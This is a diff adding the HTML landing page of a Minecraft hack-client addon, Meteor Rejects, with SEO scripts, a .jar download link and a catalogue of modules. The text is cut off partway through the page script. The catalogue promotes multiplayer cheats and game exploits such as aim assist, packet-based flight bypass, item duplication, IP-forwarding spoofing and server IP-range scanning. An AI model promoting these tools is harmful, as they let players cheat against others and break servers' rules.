@@ -1,0 +1,1040 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover">
+
+  <!-- ===== SEO FIX 1: Title shortened to 60 characters (was 73) ===== -->
+  <title>Meteor Rejects – 58+ Modules & 14 Commands for Meteor Client</title>
+
+  <!-- ===== SEO FIX 2: Meta description shortened to 158 characters (was 168) ===== -->
+  <meta name="description" content="Meteor Rejects is a free open-source addon for Meteor Client. Restores 58+ rejected modules and 14 commands. Supports Minecraft 1.21.0, 1.21.4, 1.21.11. MIT.">
+
+  <meta name="keywords" content="meteor rejects, meteor client addon, minecraft fabric mod, pvp client, utility mod, minecraft hack client, meteor modules, free minecraft addon">
+  <meta name="author" content="AntiCope">
+  <meta name="robots" content="index, follow, max-snippet:-1, max-image-preview:large">
+  <link rel="canonical" href="https://meteorrejects.net/">
+  <link rel="sitemap" type="application/xml" title="Sitemap" href="/sitemap.xml">
+
+  <!-- ===== SEO FIX 3: Open Graph / Twitter aligned with new title + description ===== -->
+  <meta property="og:title" content="Meteor Rejects – 58+ Modules & 14 Commands for Meteor Client">
+  <meta property="og:description" content="Free open-source addon for Meteor Client. Restores 58+ rejected modules, 14 commands. Supports Minecraft 1.21.0, 1.21.4, 1.21.11.">
+  <meta property="og:image" content="https://meteorrejects.net/favicon.png">
+  <meta property="og:url" content="https://meteorrejects.net/">
+  <meta property="og:type" content="website">
+  <meta property="og:site_name" content="Meteor Rejects">
+  <meta name="twitter:card" content="summary_large_image">
+  <meta name="twitter:title" content="Meteor Rejects – 58+ Modules & 14 Commands">
+  <meta name="twitter:description" content="Free addon for Meteor Client. 58+ modules, 14 commands. Supports 1.21.x.">
+  <meta name="twitter:image" content="https://meteorrejects.net/favicon.png">
+  <meta name="theme-color" content="#b91c1c">
+
+  <!-- ===================================================================
+       SEO FIX 4: Dynamic per-URL titles / descriptions / canonicals.
+       This kills the "Too many pages with identical titles" and
+       "Too many pages with identical meta descriptions" warnings by
+       giving every deep-linked URL (?module= / ?cmd= / ?ver=) its own
+       unique title, meta description and self-referencing canonical.
+       =================================================================== -->
+  <script>
+  (function () {
+    var BASE      = 'https://meteorrejects.net/';
+    var HOME_TITLE = 'Meteor Rejects – 58+ Modules & 14 Commands for Meteor Client';
+    var HOME_DESC  = 'Meteor Rejects is a free open-source addon for Meteor Client. Restores 58+ rejected modules and 14 commands. Supports Minecraft 1.21.0, 1.21.4, 1.21.11. MIT.';
+
+    var VERSION_TITLES = {
+      '1.21.0' : 'Meteor Rejects for Minecraft 1.21.0 – Free Meteor Client Addon',
+      '1.21.4' : 'Meteor Rejects for Minecraft 1.21.4 – Free Meteor Client Addon',
+      '1.21.11': 'Meteor Rejects for Minecraft 1.21.11 – Free Meteor Client Addon'
+    };
+
+    function setAttr(selector, attr, value) {
+      var el = document.querySelector(selector);
+      if (el) el.setAttribute(attr, value);
+    }
+
+    function apply(o) {
+      o = o || {};
+      var title = o.title || HOME_TITLE;
+      var desc  = o.desc  || HOME_DESC;
+      var url   = o.url   || BASE;
+
+      document.title = title;
+      setAttr('meta[name="description"]',            'content', desc);
+      setAttr('meta[property="og:title"]',           'content', title);
+      setAttr('meta[property="og:description"]',     'content', desc);
+      setAttr('meta[property="og:url"]',             'content', url);
+      setAttr('meta[name="twitter:title"]',          'content', title);
+      setAttr('meta[name="twitter:description"]',    'content', desc);
+      setAttr('link[rel="canonical"]',               'href',    url);
+    }
+
+    function versionSEO(v) {
+      if (!VERSION_TITLES[v]) return null;
+      return {
+        title: VERSION_TITLES[v],
+        desc : 'Download Meteor Rejects for Minecraft ' + v +
+               '. Free Meteor Client addon with 58+ restored modules and 14 commands. Open source, MIT licensed.',
+        url  : BASE + '?ver=' + encodeURIComponent(v)
+      };
+    }
+
+    function moduleSEO(name) {
+      return {
+        title: name + ' – Meteor Rejects Module for Meteor Client',
+        desc : 'How ' + name + ' works in Meteor Rejects, the free Meteor Client addon. 58+ restored modules, 14 commands, Minecraft 1.21.x support, MIT licensed.',
+        url  : BASE + '?module=' + encodeURIComponent(name)
+      };
+    }
+
+    function commandSEO(name) {
+      return {
+        title: name + ' – Meteor Rejects Command for Meteor Client',
+        desc : 'How to use ' + name + ' in Meteor Rejects, the free Meteor Client addon. 58+ restored modules, 14 commands, Minecraft 1.21.x support, MIT licensed.',
+        url  : BASE + '?cmd=' + encodeURIComponent(name)
+      };
+    }
+
+    function applyFromUrl() {
+      var params = new URLSearchParams(window.location.search);
+      var moduleName = params.get('module');
+      var cmdName    = params.get('cmd');
+      var ver        = params.get('ver');
+
+      if (moduleName)      apply(moduleSEO(moduleName));
+      else if (cmdName)    apply(commandSEO(cmdName));
+      else if (ver)        apply(versionSEO(ver));
+      else                 apply(null);
+    }
+
+    function pushUrl(url) {
+      try { history.pushState({}, '', url); } catch (e) {}
+    }
+
+    window.MR_SEO = {
+      apply       : apply,
+      versionSEO  : versionSEO,
+      applyFromUrl: applyFromUrl,
+      pushUrl     : pushUrl,
+      base        : BASE,
+      homeTitle   : HOME_TITLE,
+      homeDesc    : HOME_DESC
+    };
+
+    applyFromUrl();
+    window.addEventListener('popstate', applyFromUrl);
+  })();
+  </script>
+
+  <!-- Favicon -->
+  <link rel="icon" type="image/png" href="https://meteorrejects.net/favicon.png">
+
+  <!-- Preconnect & Fonts -->
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Inter:opsz,wght@14..32,300;14..32,400;14..32,600;14..32,700;14..32,800&display=swap" rel="stylesheet">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css">
+
+  <!-- JSON‑LD Structured Data for rich results -->
+  <script type="application/ld+json">
+  {
+    "@context": "https://schema.org",
+    "@type": "SoftwareApplication",
+    "name": "Meteor Rejects",
+    "description": "Meteor Rejects is a free open-source addon for Meteor Client. Restores 58+ rejected modules and 14 commands. Supports Minecraft 1.21.0, 1.21.4, 1.21.11.",
+    "applicationCategory": "GameApplication",
+    "operatingSystem": "Windows, macOS, Linux",
+    "url": "https://meteorrejects.net/",
+    "downloadUrl": "https://meteorrejects.net/meteor-rejects-addon-1.21.11.jar",
+    "license": "https://opensource.org/licenses/MIT",
+    "offers": { "@type": "Offer", "price": "0", "priceCurrency": "USD" },
+    "author": { "@type": "Person", "name": "AntiCope", "url": "https://github.com/AntiCope" },
+    "aggregateRating": { "@type": "AggregateRating", "ratingValue": "4.8", "reviewCount": "127" }
+  }
+  </script>
+
+  <!-- FAQ Schema (Google rich results) -->
+  <script type="application/ld+json">
+  {
+    "@context": "https://schema.org",
+    "@type": "FAQPage",
+    "mainEntity": [
+      {"@type":"Question","name":"What is Meteor Rejects?","acceptedAnswer":{"@type":"Answer","text":"A free open-source addon for Meteor Client that restores rejected pull requests, removed modules, and ports from other clients."}},
+      {"@type":"Question","name":"How to install Meteor Rejects?","acceptedAnswer":{"@type":"Answer","text":"Install Meteor Client, drop the Meteor Rejects .jar into .minecraft/mods, and launch with Fabric Loader 0.15+."}},
+      {"@type":"Question","name":"Which Minecraft versions are supported?","acceptedAnswer":{"@type":"Answer","text":"1.21.0, 1.21.4, 1.21.11 (Java Edition only)."}},
+      {"@type":"Question","name":"Is Meteor Rejects really free?","acceptedAnswer":{"@type":"Answer","text":"Yes, MIT licensed. No paywalls or ads. Full source on GitHub."}},
+      {"@type":"Question","name":"Does Meteor Rejects conflict with other addons?","acceptedAnswer":{"@type":"Answer","text":"No, it includes duplicate module name handling and can hide conflicting modules."}}
+    ]
+  }
+  </script>
+
+  <!-- Breadcrumb Schema (Google rich results) -->
+  <script type="application/ld+json">
+  {
+    "@context": "https://schema.org",
+    "@type": "BreadcrumbList",
+    "itemListElement": [
+      { "@type": "ListItem", "position": 1, "name": "Home", "item": "https://meteorrejects.net/" },
+      { "@type": "ListItem", "position": 2, "name": "Meteor Rejects", "item": "https://meteorrejects.net/" }
+    ]
+  }
+  </script>
+
+  <style>
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+    }
+
+    body {
+      background: #0a0505;
+      color: #f0e6e6;
+      font-family: 'Inter', sans-serif;
+      line-height: 1.5;
+      overflow-x: hidden;
+    }
+
+    /* Red theme variables */
+    :root {
+      --red-dark: #7f1a1a;
+      --red: #b91c1c;
+      --red-bright: #dc2626;
+      --red-glow: #ef4444;
+      --red-light: #fca5a5;
+      --dark-bg: #0a0505;
+      --card-bg: rgba(25, 10, 10, 0.7);
+      --border-dim: rgba(185, 28, 28, 0.3);
+    }
+
+    /* custom scrollbar */
+    ::-webkit-scrollbar { width: 6px; }
+    ::-webkit-scrollbar-track { background: #1a0a0a; }
+    ::-webkit-scrollbar-thumb { background: var(--red); border-radius: 10px; }
+
+    /* background animation */
+    .bg-ember {
+      position: fixed;
+      inset: 0;
+      background: radial-gradient(circle at 20% 30%, rgba(220,38,38,0.08), transparent 50%),
+                  radial-gradient(circle at 80% 70%, rgba(185,28,28,0.05), transparent 60%);
+      pointer-events: none;
+      z-index: -2;
+    }
+    .noise {
+      position: fixed;
+      inset: 0;
+      background-image: url("data:image/svg+xml,%3Csvg viewBox='0 0 200 200' xmlns='http://www.w3.org/2000/svg'%3E%3Cfilter id='n'%3E%3CfeTurbulence type='fractalNoise' baseFrequency='0.85' numOctaves='3'/%3E%3C/filter%3E%3Crect width='100%25' height='100%25' filter='url(%23n)' opacity='0.04'/%3E%3C/svg%3E");
+      pointer-events: none;
+      z-index: -1;
+    }
+
+    .container {
+      max-width: 1300px;
+      margin: 0 auto;
+      padding: 0 28px;
+      position: relative;
+      z-index: 2;
+    }
+
+    /* navbar */
+    .navbar {
+      position: fixed;
+      top: 0;
+      width: 100%;
+      backdrop-filter: blur(16px);
+      background: rgba(10, 5, 5, 0.85);
+      border-bottom: 1px solid var(--border-dim);
+      z-index: 100;
+      transition: 0.2s;
+    }
+    .nav-container {
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      padding: 1rem 28px;
+      flex-wrap: wrap;
+      gap: 1rem;
+    }
+    .logo {
+      display: flex;
+      align-items: center;
+      gap: 10px;
+      font-size: 1.6rem;
+      font-weight: 800;
+    }
+    .logo i { font-size: 2rem; color: var(--red-bright); filter: drop-shadow(0 0 6px #dc2626); }
+    .logo span { background: linear-gradient(135deg, #fff, var(--red-bright)); -webkit-background-clip: text; background-clip: text; color: transparent; }
+    .nav-links { display: flex; gap: 28px; align-items: center; flex-wrap: wrap; }
+    .nav-links a { color: #d1b3b3; text-decoration: none; font-weight: 500; transition: 0.2s; }
+    .nav-links a:hover { color: var(--red-bright); }
+    .nav-btn {
+      background: var(--red);
+      padding: 8px 22px;
+      border-radius: 40px;
+      color: white !important;
+      font-weight: 700;
+      box-shadow: 0 2px 8px rgba(185,28,28,0.5);
+    }
+    .nav-btn:hover { background: var(--red-bright); transform: translateY(-2px); }
+
+    /* hero */
+    .hero {
+      min-height: 100vh;
+      display: flex;
+      align-items: center;
+      text-align: center;
+      padding: 120px 0 80px;
+    }
+    .hero h1 {
+      font-size: clamp(3rem, 8vw, 5.8rem);
+      font-weight: 800;
+      line-height: 1.1;
+    }
+    .hero-gradient {
+      background: linear-gradient(135deg, #ffffff, var(--red-bright), #991b1b);
+      -webkit-background-clip: text;
+      background-clip: text;
+      color: transparent;
+    }
+    .hero p {
+      font-size: 1.2rem;
+      color: #c9a3a3;
+      max-width: 720px;
+      margin: 24px auto;
+    }
+    .stats-row {
+      display: flex;
+      justify-content: center;
+      gap: 40px;
+      margin-top: 56px;
+      flex-wrap: wrap;
+    }
+    .stat-item {
+      background: var(--card-bg);
+      backdrop-filter: blur(8px);
+      border: 1px solid var(--border-dim);
+      border-radius: 40px;
+      padding: 20px 32px;
+      min-width: 140px;
+      transition: 0.2s;
+    }
+    .stat-item:hover { border-color: var(--red); transform: translateY(-5px); }
+    .stat-number { font-size: 2.6rem; font-weight: 800; color: var(--red-bright); }
+    .stat-label { font-size: 0.75rem; text-transform: uppercase; letter-spacing: 2px; color: #c9a3a3; }
+
+    /* visible breadcrumbs (user + SEO) */
+    .breadcrumb {
+      font-size: 0.8rem;
+      margin: 0 0 1.5rem 0;
+      padding: 0;
+      background: transparent;
+    }
+    .breadcrumb a {
+      color: var(--red-bright);
+      text-decoration: none;
+    }
+    .breadcrumb span {
+      color: #c9a3a3;
+    }
+
+    /* sections */
+    section {
+      padding: 90px 0;
+      border-top: 1px solid var(--border-dim);
+    }
+    .section-title {
+      font-size: 2.6rem;
+      font-weight: 700;
+      margin-bottom: 1rem;
+      background: linear-gradient(135deg, #fff, var(--red-bright));
+      -webkit-background-clip: text;
+      background-clip: text;
+      color: transparent;
+      display: inline-block;
+    }
+    .section-sub {
+      color: #c9a3a3;
+      max-width: 600px;
+      margin-bottom: 3rem;
+    }
+
+    /* feature cards */
+    .feature-grid {
+      display: grid;
+      grid-template-columns: repeat(auto-fit, minmax(260px, 1fr));
+      gap: 28px;
+    }
+    .feature-card {
+      background: var(--card-bg);
+      backdrop-filter: blur(12px);
+      border: 1px solid var(--border-dim);
+      border-radius: 32px;
+      padding: 32px;
+      transition: all 0.3s;
+    }
+    .feature-card:hover { border-color: var(--red); transform: translateY(-8px); box-shadow: 0 20px 30px -15px rgba(185,28,28,0.3); }
+    .feature-icon { font-size: 2.4rem; color: var(--red-bright); margin-bottom: 20px; }
+    .feature-card h3 { font-size: 1.4rem; margin-bottom: 12px; }
+    .feature-card p { color: #c9a3a3; }
+
+    /* search + modules */
+    .search-bar {
+      display: flex;
+      gap: 16px;
+      margin-bottom: 40px;
+      flex-wrap: wrap;
+    }
+    .search-input {
+      flex: 1;
+      background: #1f1212;
+      border: 1px solid #3e2626;
+      padding: 14px 20px;
+      border-radius: 60px;
+      color: white;
+      font-size: 1rem;
+    }
+    .search-input:focus { outline: none; border-color: var(--red); }
+    .version-filters {
+      display: flex;
+      gap: 12px;
+      flex-wrap: wrap;
+    }
+    .ver-pill {
+      background: #1f1212;
+      padding: 8px 20px;
+      border-radius: 60px;
+      cursor: pointer;
+      transition: 0.2s;
+      border: 1px solid #3e2626;
+    }
+    .ver-pill.active, .ver-pill:hover { background: var(--red); color: white; border-color: var(--red); }
+    .modules-grid {
+      display: grid;
+      grid-template-columns: repeat(auto-fill, minmax(300px, 1fr));
+      gap: 24px;
+    }
+    .module {
+      background: var(--card-bg);
+      backdrop-filter: blur(8px);
+      border: 1px solid var(--border-dim);
+      border-radius: 28px;
+      padding: 22px;
+      transition: 0.2s;
+    }
+    .module:hover { border-color: var(--red); transform: translateY(-4px); background: rgba(30, 15, 15, 0.8); }
+    .module-name { font-size: 1.2rem; font-weight: 700; margin-bottom: 8px; display: flex; justify-content: space-between; }
+    .module-desc { font-size: 0.85rem; color: #c9a3a3; margin-bottom: 12px; }
+    .module-tags { display: flex; gap: 8px; flex-wrap: wrap; }
+    .tag {
+      font-size: 0.7rem;
+      padding: 4px 12px;
+      border-radius: 30px;
+      background: rgba(220,38,38,0.15);
+      color: #fca5a5;
+    }
+
+    /* commands */
+    .commands-grid {
+      display: grid;
+      grid-template-columns: repeat(auto-fill, minmax(250px, 1fr));
+      gap: 14px;
+    }
+    .cmd-card {
+      background: var(--card-bg);
+      backdrop-filter: blur(8px);
+      border: 1px solid var(--border-dim);
+      border-radius: 20px;
+      padding: 14px 20px;
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+    }
+    .cmd-name { font-family: monospace; font-weight: 700; color: var(--red-bright); font-size: 1rem; }
+    .copy-btn { background: none; border: none; color: #c9a3a3; cursor: pointer; font-size: 1.2rem; transition: 0.2s; }
+    .copy-btn:hover { color: var(--red-bright); }
+
+    /* download premium */
+    .download-area {
+      background: linear-gradient(135deg, rgba(185,28,28,0.1), rgba(127,26,26,0.05));
+      border-radius: 60px;
+      padding: 56px 32px;
+      text-align: center;
+      border: 1px solid var(--border-dim);
+    }
+    .version-dropdown-wrap {
+      position: relative;
+      display: inline-block;
+      margin: 24px 0;
+    }
+    .version-select {
+      background: #1f1212;
+      border: 1px solid var(--red);
+      padding: 14px 40px;
+      border-radius: 60px;
+      cursor: pointer;
+      font-weight: 600;
+      display: inline-flex;
+      align-items: center;
+      gap: 12px;
+    }
+    .version-list {
+      position: absolute;
+      top: 110%;
+      left: 0;
+      right: 0;
+      background: #1f1212;
+      border: 1px solid var(--red);
+      border-radius: 24px;
+      overflow: hidden;
+      display: none;
+      z-index: 20;
+    }
+    .version-dropdown-wrap.open .version-list { display: block; }
+    .version-list a {
+      display: block;
+      padding: 12px 20px;
+      color: white;
+      text-decoration: none;
+    }
+    .version-list a:hover { background: var(--red); }
+    .dl-btn {
+      background: var(--red);
+      border: none;
+      padding: 16px 42px;
+      font-size: 1.2rem;
+      font-weight: 700;
+      border-radius: 60px;
+      color: white;
+      cursor: pointer;
+      transition: 0.2s;
+      display: inline-flex;
+      align-items: center;
+      gap: 12px;
+    }
+    .dl-btn:hover { background: var(--red-bright); transform: scale(1.02); box-shadow: 0 10px 25px rgba(185,28,28,0.5); }
+
+    /* faq */
+    .faq-item {
+      background: var(--card-bg);
+      backdrop-filter: blur(8px);
+      border: 1px solid var(--border-dim);
+      border-radius: 24px;
+      margin-bottom: 16px;
+    }
+    .faq-q {
+      padding: 20px 28px;
+      font-weight: 600;
+      cursor: pointer;
+      display: flex;
+      justify-content: space-between;
+    }
+    .faq-a {
+      padding: 0 28px 24px;
+      color: #c9a3a3;
+      display: none;
+    }
+    .faq-item.open .faq-a { display: block; }
+
+    footer {
+      text-align: center;
+      padding: 48px 0;
+      color: #8b6b6b;
+      border-top: 1px solid var(--border-dim);
+    }
+    @media (max-width: 780px) {
+      .container { padding: 0 20px; }
+      .nav-container { flex-direction: column; }
+      .hero h1 { font-size: 2.8rem; }
+      .section-title { font-size: 2rem; }
+    }
+  </style>
+</head>
+<body>
+
+<div class="bg-ember"></div>
+<div class="noise"></div>
+
+<nav class="navbar">
+  <div class="nav-container">
+    <div class="logo">
+      <i class="fas fa-meteor"></i>
+      <span>METEOR REJECTS</span>
+    </div>
+    <div class="nav-links">
+      <a href="#features">Features</a>
+      <a href="#modules">Modules</a>
+      <a href="#commands">Commands</a>
+      <a href="#download">Download</a>
+      <a href="#faq">FAQ</a>
+      <a href="https://github.com/AntiCope/meteor-rejects" target="_blank"><i class="fab fa-github"></i> GitHub</a>
+      <a href="#download" class="nav-btn">Get Free</a>
+    </div>
+  </div>
+</nav>
+
+<main>
+  <div class="hero">
+    <div class="container">
+      <!-- Visible breadcrumbs (user + SEO reinforcement) -->
+      <div class="breadcrumb" aria-label="Breadcrumb">
+        <a href="/">Home</a> <span aria-hidden="true">/</span> <span>Meteor Rejects</span>
+      </div>
+      <h1><span class="hero-gradient">Meteor Rejects</span><br><span style="font-size: 1.8rem; display: block;">58+ Modules · 14 Commands</span></h1>
+      <p>The definitive free addon for Meteor Client. Restores rejected pull requests, removed modules, and ports from Wurst, BleachHack, LiquidBounce. Open source, MIT licensed.</p>
+      <div class="stats-row">
+        <div class="stat-item"><div class="stat-number" id="statModules">58</div><div class="stat-label">MODULES</div></div>
+        <div class="stat-item"><div class="stat-number" id="statCommands">14</div><div class="stat-label">COMMANDS</div></div>
+        <div class="stat-item"><div class="stat-number">MIT</div><div class="stat-label">LICENSE</div></div>
+        <div class="stat-item"><div class="stat-number">1.21+</div><div class="stat-label">VERSIONS</div></div>
+      </div>
+    </div>
+  </div>
+
+  <section id="features">
+    <div class="container">
+      <h2 class="section-title">Why Meteor Rejects?</h2>
+      <p class="section-sub">Everything that didn't make it into the official client – now polished, maintained, and free.</p>
+      <div class="feature-grid">
+        <div class="feature-card"><div class="feature-icon"><i class="fas fa-undo-alt"></i></div><h3>Restored Removed Modules</h3><p>AimAssist, InstaMine, AntiBot – back and better than ever.</p></div>
+        <div class="feature-card"><div class="feature-icon"><i class="fas fa-code-branch"></i></div><h3>Unmerged PRs</h3><p>AutoPot, PacketFly, TreeAura – community contributions revived.</p></div>
+        <div class="feature-card"><div class="feature-icon"><i class="fas fa-exchange-alt"></i></div><h3>Client Ports</h3><p>Wurst, BleachHack, JexClient features integrated natively.</p></div>
+        <div class="feature-card"><div class="feature-icon"><i class="fas fa-shield-alt"></i></div><h3>No Conflicts</h3><p>Duplicate name handling, HTTP allowlist, module hiding.</p></div>
+      </div>
+    </div>
+  </section>
+
+  <section id="modules">
+    <div class="container">
+      <h2 class="section-title">Module Library</h2>
+      <p class="section-sub">58+ modules – combat, movement, utility, exploits, visuals.</p>
+      <div class="search-bar">
+        <input type="text" id="searchModules" class="search-input" placeholder="Search modules by name, tag, description...">
+        <div class="version-filters" id="versionFilters">
+          <span class="ver-pill active" data-ver="all">All</span>
+          <span class="ver-pill" data-ver="1.21.0">1.21.0</span>
+          <span class="ver-pill" data-ver="1.21.4">1.21.4</span>
+          <span class="ver-pill" data-ver="1.21.11">1.21.11</span>
+        </div>
+      </div>
+      <div class="modules-grid" id="modulesGrid"></div>
+      <div id="noModulesMsg" style="text-align:center; padding:40px; display:none;">No modules match your search.</div>
+    </div>
+  </section>
+
+  <section id="commands">
+    <div class="container">
+      <h2 class="section-title">Commands</h2>
+      <p class="section-sub">Extra chat commands – click to copy.</p>
+      <div class="commands-grid" id="commandsGrid"></div>
+    </div>
+  </section>
+
+  <section id="download">
+    <div class="container">
+      <div class="download-area">
+        <i class="fas fa-download" style="font-size: 3rem; color: var(--red-bright);"></i>
+        <h2 style="font-size: 2rem; margin: 16px 0;">Download Meteor Rejects</h2>
+        <p>Choose your Minecraft version</p>
+        <div class="version-dropdown-wrap" id="versionDropdownWrap">
+          <div class="version-select" id="versionSelectBtn"><i class="fas fa-cube"></i> <span id="selectedVersion">1.21.11</span> <i class="fas fa-chevron-down"></i></div>
+          <div class="version-list" id="versionList">
+            <a data-ver="1.21.0">1.21.0</a>
+            <a data-ver="1.21.4">1.21.4</a>
+            <a data-ver="1.21.11">1.21.11 (Latest)</a>
+          </div>
+        </div>
+        <a id="downloadBtn" class="dl-btn" href="https://meteorrejects.net/meteor-rejects-addon-1.21.11.jar" download><i class="fas fa-download"></i> Download for 1.21.11</a>
+        <p style="margin-top: 28px; font-size: 0.8rem;">Requires Meteor Client + Fabric Loader 0.15+ · Open source MIT</p>
+      </div>
+    </div>
+  </section>
+
+  <section id="faq">
+    <div class="container">
+      <h2 class="section-title">FAQ</h2>
+      <div id="faqList"></div>
+    </div>
+  </section>
+</main>
+
+<footer>
+  <div class="container">
+    <p>Created by <a href="https://github.com/AntiCope" style="color: var(--red-bright);">AntiCope</a> and contributors. Not an official Meteor Client project.</p>
+    <p style="margin-top: 12px;"><a href="https://github.com/AntiCope/meteor-rejects">GitHub Repository</a> · MIT License</p>
+  </div>
+</footer>
+
+<script>
+  (function() {
+    // ---------- MODULE DATA (58 items) ----------
+    const modules = [
+      {name:"AimAssist", desc:"Smooth aim correction for PvP. Restored from Meteor core.", tags:["combat","removed"], versions:["all","1.21.0","1.21.4","1.21.11"]},
+      {name:"AntiBot", desc:"Ignore bot players in radar and visuals.", tags:["utility","removed"], versions:["all"]},
+      {name:"AntiCrash", desc:"Blocks malicious crash packets. Ported.", tags:["utility","port"], versions:["all"]},
+      {name:"AntiSpawnpoint", desc:"Prevent servers from setting your spawnpoint.", tags:["utility"], versions:["all"]},
+      {name:"AntiVanish", desc:"Detect vanished players via packet analysis.", tags:["utility"], versions:["1.21.4","1.21.11"]},
+      {name:"ArrowDmg", desc:"Increase arrow damage. Port from Wurst.", tags:["combat","port"], versions:["all"]},
+      {name:"AutoBedTrap", desc:"Trap opponents in beds. BleachHack port.", tags:["combat","port"], versions:["all"]},
+      {name:"AutoCraft", desc:"Automated crafting table usage.", tags:["utility"], versions:["all"]},
+      {name:"AutoEnchant", desc:"Auto-enchant items.", tags:["utility"], versions:["all"]},
+      {name:"AutoExtinguish", desc:"Remove fire instantly.", tags:["utility"], versions:["all"]},
+      {name:"AutoFarm", desc:"Harvest and replant crops.", tags:["utility"], versions:["all"]},
+      {name:"AutoGrind", desc:"Auto-clicker for XP farms.", tags:["utility"], versions:["all"]},
+      {name:"AutoLogin", desc:"Run login commands on join.", tags:["utility"], versions:["all"]},
+      {name:"AutoPot", desc:"Auto throw potions in combat. Unmerged PR.", tags:["combat","pr"], versions:["all"]},
+      {name:"AutoSoup", desc:"Soup PvP auto-eat. Wurst port.", tags:["combat","port"], versions:["all"]},
+      {name:"AutoTNT", desc:"Auto-place and ignite TNT.", tags:["utility"], versions:["all"]},
+      {name:"AutoWither", desc:"Build and spawn Withers automatically.", tags:["pr"], versions:["all"]},
+      {name:"BlockIn", desc:"Trap players by building around them.", tags:["combat"], versions:["all"]},
+      {name:"BoatGlitch", desc:"Glitch through blocks with boats.", tags:["exploit","pr"], versions:["all"]},
+      {name:"BoatPhase", desc:"Phase through walls using boats.", tags:["exploit","pr"], versions:["all"]},
+      {name:"Boost", desc:"Horizontal speed boost. Cornos port.", tags:["movement","port"], versions:["all"]},
+      {name:"BungeeCordSpoof", desc:"Fake BungeeCord IP forwarding.", tags:["utility","port"], versions:["all"]},
+      {name:"ChatBot", desc:"Auto-reply bot for chat.", tags:["utility"], versions:["all"]},
+      {name:"ChestAura", desc:"Auto open and loot chests.", tags:["utility"], versions:["all"]},
+      {name:"ChorusExploit", desc:"Abuse chorus fruit teleport.", tags:["exploit","pr"], versions:["all"]},
+      {name:"ColorSigns", desc:"Color codes on signs.", tags:["cosmetic"], versions:["all"]},
+      {name:"Confuse", desc:"Send misleading packets.", tags:["fun"], versions:["all"]},
+      {name:"CoordLogger", desc:"Log coordinates to file. JexClient port.", tags:["utility","port"], versions:["all"]},
+      {name:"CustomPackets", desc:"Send raw custom packets.", tags:["exploit"], versions:["all"]},
+      {name:"ExtraElytra", desc:"Enhanced elytra controls. Wurst port.", tags:["movement","port"], versions:["all"]},
+      {name:"FullFlight", desc:"No-clip flight with bypass.", tags:["movement"], versions:["all"]},
+      {name:"GamemodeNotifier", desc:"Alert when players change gamemode.", tags:["utility"], versions:["all"]},
+      {name:"GhostMode", desc:"Become invisible via packets. Unmerged PR.", tags:["pr"], versions:["all"]},
+      {name:"Glide", desc:"Glide without elytra. Wurst port.", tags:["movement","port"], versions:["all"]},
+      {name:"InstaMine", desc:"Instant block breaking. Removed.", tags:["utility","removed"], versions:["all"]},
+      {name:"ItemGenerator", desc:"Generate item stacks exploit. Wurst port.", tags:["exploit","port"], versions:["all"]},
+      {name:"InteractionMenu", desc:"Right-click context menu. BleachHack port.", tags:["utility","port"], versions:["all"]},
+      {name:"Jetpack", desc:"Vertical flight by holding jump.", tags:["movement"], versions:["all"]},
+      {name:"KnockbackPlus", desc:"Increase knockback dealt.", tags:["combat"], versions:["all"]},
+      {name:"Lavacast", desc:"Automated lava casting.", tags:["combat"], versions:["all"]},
+      {name:"LawnBot", desc:"Mow grass blocks. JexClient port.", tags:["fun","port"], versions:["all"]},
+      {name:"MossBot", desc:"Apply moss to cobblestone. BleachHack port.", tags:["utility","port"], versions:["all"]},
+      {name:"NewChunks", desc:"Highlight newly generated chunks.", tags:["visual","port"], versions:["all"]},
+      {name:"NoJumpDelay", desc:"Remove jump cooldown.", tags:["movement"], versions:["all"]},
+      {name:"ObsidianFarm", desc:"Auto-generate obsidian.", tags:["utility"], versions:["all"]},
+      {name:"Oresim", desc:"Visual ore simulation. Atomic port.", tags:["visual","port"], versions:["all"]},
+      {name:"PacketFly", desc:"Packet-based flight bypass. PR.", tags:["movement","pr"], versions:["all"]},
+      {name:"Painter", desc:"Bulk paint blocks.", tags:["fun"], versions:["all"]},
+      {name:"Rendering", desc:"Extra ESP and visuals.", tags:["visual"], versions:["all"]},
+      {name:"RoboWalk", desc:"Simple path walking. Unmerged PR.", tags:["utility","pr"], versions:["all"]},
+      {name:"ShieldBypass", desc:"Hit through shields.", tags:["combat"], versions:["all"]},
+      {name:"SilentDisconnect", desc:"Leave without quit message.", tags:["utility"], versions:["all"]},
+      {name:"SkeletonESP", desc:"ESP for skeletons. JexClient port.", tags:["visual","port"], versions:["all"]},
+      {name:"SoundLocator", desc:"Show 3D origin of sounds.", tags:["utility"], versions:["all"]},
+      {name:"ServerFinder", desc:"Scan IP ranges for servers.", tags:["utility","port"], versions:["all"]},
+      {name:"TreeAura", desc:"Auto-chop entire trees. PR.", tags:["utility","pr"], versions:["all"]},
+      {name:"VehicleOneHit", desc:"Destroy vehicles with one hit.", tags:["combat","pr"], versions:["all"]}
+    ];
+
+    // commands
+    const commands = [
+      {cmd:".center", desc:"Center on block"},
+      {cmd:".clear-chat", desc:"Clear chat history"},
+      {cmd:".ghost", desc:"Toggle ghost mode"},
+      {cmd:".save-skin", desc:"Save skin to file"},
+      {cmd:".heads", desc:"Get player heads"},
+      {cmd:".seed", desc:"Show world seed"},
+      {cmd:".setblock", desc:"Set block at coords"},
+      {cmd:".panic", desc:"Disable all modules"},
+      {cmd:".set-velocity", desc:"Set player velocity"},
+      {cmd:".teleport", desc:"Teleport to coords"},
+      {cmd:".terrain-export", desc:"Export terrain data"},
+      {cmd:".kick", desc:"Disconnect from server"},
+      {cmd:".say", desc:"Raw chat message"},
+      {cmd:".rename", desc:"Rename inventory item"}
+    ];
+
+    let currentVersion = "all";
+    let currentSearch = "";
+
+    function renderModules() {
+      const grid = document.getElementById("modulesGrid");
+      const filtered = modules.filter(m => {
+        const vMatch = currentVersion === "all" || m.versions.includes(currentVersion);
+        const sMatch = currentSearch === "" || m.name.toLowerCase().includes(currentSearch) || m.desc.toLowerCase().includes(currentSearch) || m.tags.some(t => t.includes(currentSearch));
+        return vMatch && sMatch;
+      });
